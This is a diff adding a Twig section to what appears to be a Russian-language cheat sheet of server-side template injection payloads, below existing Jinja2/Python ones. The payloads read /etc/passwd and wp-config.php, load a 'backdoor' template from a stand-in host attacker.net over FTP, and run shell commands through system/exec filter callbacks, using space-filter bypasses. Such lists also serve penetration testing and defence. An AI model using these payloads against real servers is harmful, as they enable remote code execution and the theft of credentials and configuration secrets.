@@ -118,3 +118,24 @@ _import__('os').popen('id').read()")}}
 {{''.__class__.__mro__[1].__subclasses__()[280]('id', shell=True, stdout=-1).communicate()}}
 {{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('id').read()}}
 ```
+
+### Twig
+
+#### Чтение файлов с удаленного сервера:
+```
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{include("wp-config.php")}}
+```
+#### Выполнение файлов на удаленном сервере:
+```
+{{self}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id']|map('system')|join}}
+{{['id',1]|sort('system')|join}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+```
